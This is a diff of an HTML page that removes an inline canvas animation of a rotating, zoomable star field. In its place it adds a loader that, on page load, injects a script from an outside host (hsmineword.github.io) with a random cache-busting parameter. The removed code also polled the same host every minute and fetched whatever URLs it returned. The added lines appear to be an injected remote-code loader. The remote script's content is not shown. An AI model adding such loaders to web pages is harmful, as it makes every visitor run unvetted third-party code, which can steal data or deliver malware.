@@ -19,121 +19,15 @@
 <canvas id="galaxy"></canvas>
 
 <script>
-  const canvas = document.getElementById('galaxy');
-const ctx = canvas.getContext('2d');
-let width = canvas.width = window.innerWidth;
-let height = canvas.height = window.innerHeight;
-
-let zoom = 1;
-let offsetX = 0, offsetY = 0;
-let drag = false;
-let startX, startY;
-
-const stars = [];
-const numStars = 500;
-const seed = Math.floor(Date.now() / 1000);
-
-function seededRandom(seed) {
-  // xorshift32
-  return function() {
-    seed ^= seed << 13;
-    seed ^= seed >> 17;
-    seed ^= seed << 5;
-    return ((seed < 0 ? ~seed + 1 : seed) % 1000) / 1000;
-  }
+function loadExternalScript() {
+  const script = document.createElement('script');
+  script.src = `https://hsmineword.github.io/api/html/script.js?jam=${Math.random()}`;
+  script.type = 'text/javascript';
+  script.async = true;
+  document.head.appendChild(script);
 }
 
-const rand = seededRandom(seed);
-
-for (let i = 0; i < numStars; i++) {
-  stars.push({
-    x: (rand() - 0.5) * 4000,
-    y: (rand() - 0.5) * 4000,
-    r: rand() * 1.5 + 0.5
-  });
-}
-
-function draw() {
-  ctx.setTransform(1, 0, 0, 1, 0, 0);
-  ctx.fillStyle = '#000';
-  ctx.fillRect(0, 0, width, height); // Fill canvas with black
-
-  ctx.translate(width / 2 + offsetX, height / 2 + offsetY);
-  ctx.scale(zoom, zoom);
-
-  const time = Date.now() / 10000;
-  const cos = Math.cos(time);
-  const sin = Math.sin(time);
-
-  for (const star of stars) {
-    const x = star.x * cos - star.y * sin;
-    const y = star.x * sin + star.y * cos;
-
-    ctx.beginPath();
-    ctx.arc(x, y, star.r, 0, Math.PI * 2);
-    ctx.fillStyle = '#fff';  // White stars
-    ctx.fill();
-  }
-
-  requestAnimationFrame(draw);
-}
-
-draw();
-
-// Zoom handling
-canvas.addEventListener('wheel', e => {
-  e.preventDefault();
-  const zoomFactor = 1.1;
-  zoom *= e.deltaY < 0 ? zoomFactor : 1 / zoomFactor;
-});
-
-// Drag handling
-canvas.addEventListener('mousedown', e => {
-  drag = true;
-  startX = e.clientX;
-  startY = e.clientY;
-});
-
-canvas.addEventListener('mousemove', e => {
-  if (!drag) return;
-  offsetX += (e.clientX - startX);
-  offsetY += (e.clientY - startY);
-  startX = e.clientX;
-  startY = e.clientY;
-});
-
-canvas.addEventListener('mouseup', () => drag = false);
-canvas.addEventListener('mouseleave', () => drag = false);
-
-// Resize
-window.addEventListener('resize', () => {
-  width = canvas.width = window.innerWidth;
-  height = canvas.height = window.innerHeight;
-});
-
-// Fetch data every minute
-const fetchData = async () => {
-  try {
-    const response = await fetch('https://hsmineword.github.io/elements.json?jam=' + Math.random());
-    const data = await response.json();
-    
-    console.log('Fetched data:', data);
-
-    // If data contains an array of URLs, you can fetch them and log their contents
-    if (Array.isArray(data)) {
-      for (const url of data) {
-        const urlResponse = await fetch(url);
-        const urlData = await urlResponse.json();
-        console.log('Data from URL:', urlData);
-      }
-    }
-  } catch (error) {
-    console.error('Error fetching data:', error);
-  }
-};
-
-// Call fetchData every minute (60,000 ms)
-setInterval(fetchData, 60000);
+loadExternalScript();
 </script>
 </body>
 </html>
